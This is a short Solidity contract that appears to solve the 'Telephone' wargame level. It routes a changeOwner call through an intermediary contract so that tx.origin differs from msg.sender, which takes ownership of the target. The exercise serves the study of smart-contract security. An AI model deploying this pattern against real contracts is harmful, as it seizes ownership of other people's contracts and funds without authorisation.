// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external ;
}

contract TelephoneAttack{

    ITelephone telephone;
    
    constructor(address _telephone)  {
        telephone = ITelephone(_telephone);
    }

    function changeOwnerAttack() public returns (bool){
      (bool success,) = address(telephone).call(abi.encodeWithSignature("changeOwner(address)", msg.sender));

      return success;
    }
}